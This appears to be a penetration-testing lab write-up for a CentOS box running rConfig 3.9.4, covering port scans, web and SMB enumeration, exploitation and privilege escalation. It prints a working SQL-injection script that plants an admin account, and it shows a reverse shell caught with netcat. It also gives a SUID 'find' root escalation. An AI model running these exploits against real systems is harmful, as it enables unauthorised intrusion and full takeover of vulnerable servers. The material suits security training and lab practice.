 
# Export
```md
export IP="192.168.78.57"
export URL="http://192.168.78.57:80/FUZZ"
```

<hr>

# RCE
+ PoC: https://www.exploit-db.com/exploits/48241
+ Create user using modified script: https://www.exploit-db.com/exploits/48261
```py
#!/usr/bin/python3
import requests
import sys
import urllib.parse
import string
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from requests.exceptions import Timeout

if len(sys.argv) != 2:
    print ("[+] Usage : ./rconfig_exploit.py https://target")
    exit()

target = sys.argv[1]

vuln_page="/commands.inc.php"
vuln_parameters="?searchOption=contains&searchField=vuln&search=search&searchColumn=command"

print ("[+] Adding a temporary admin user...")
fake_id = str(random.randint(200,900))
fake_user = "attacker"
fake_pass_md5 = "21232f297a57a5a743894a0e4a801fc3" # hash of 'admin'
fake_userid_md5 = "6c97424dc92f14ae78f8cc13cd08308d"
addUserPayload="%20;INSERT%20INTO%20`users`%20(`id`,%20`username`,%20`password`,%20`userid`,%20`userlevel`,%20`email`,%20`timestamp`,%20`status`)%20VALUES%20("+fake_id+",%20'"+fake_user+"',%20'"+fake_pass_md5+"',%20'"+fake_userid_md5+"',%209,%20'"+fake_user+"@domain.com',%201346920339,%201);--"
encoded_request = target+vuln_page+vuln_parameters+addUserPayload
firstrequest = requests.session()
exploit_req = firstrequest.get(encoded_request,verify=False)

request = requests.session()
login_info = {
    "user": fake_user,
    "pass": "admin",
    "sublogin": 1
}
print ("[+] Authenticating as: "+fake_user+":admin ...")
print ("[+] Done.")
```
+ Payload: 
```bash
# python3 48241.py https://192.168.78.57:8081 attacker admin 192.168.49.78 80
...
```

```bash
# nc -nlvp 80                                                                                                                                                                           2 ⚙ 
listening on [any] 80 ...                                                                                                                                                                     
connect to [192.168.49.78] from (UNKNOWN) [192.168.78.57] 56142
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
```

<hr>

# Privilege Escalation
```bash
bash-4.2$ find / -perm -4000 -ls 2>/dev/null
12596477  196 -rwsr-xr-x   1 root     root       199304 Oct 30  2018 /usr/bin/find
[...]
```

+ Payload:
```bash
bash-4.2$ find . -exec /bin/bash -p \;
bash-4.2# whoami
root
```

<hr>

# Nmap
```bash
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.2
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
111/tcp  open  rpcbind     syn-ack ttl 63 2-4 (RPC #100000)
111/tcp   rpcbind
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       syn-ack ttl 63 MariaDB (unauthorized)
8081/tcp open  ssl/http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
```

<hr>

# Web Application
##### Port 80

+ Discovery

```bash
.htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9]
.hta                    [Status: 403, Size: 206, Words: 15, Lines: 9]
.htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9]
cgi-bin/                [Status: 403, Size: 210, Words: 15, Lines: 9
```

##### Port 8081
+ Running **rConfig - Configuration Management** - **rConfig Version 3.9.4** → Vulnerable version → RCE?

<hr>

# SMB
+ Share files:
```bash
# smbclient -L $IP                               
Enter WORKGROUP\root's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.10.4)
SMB1 disabled -- no workgroup available
```

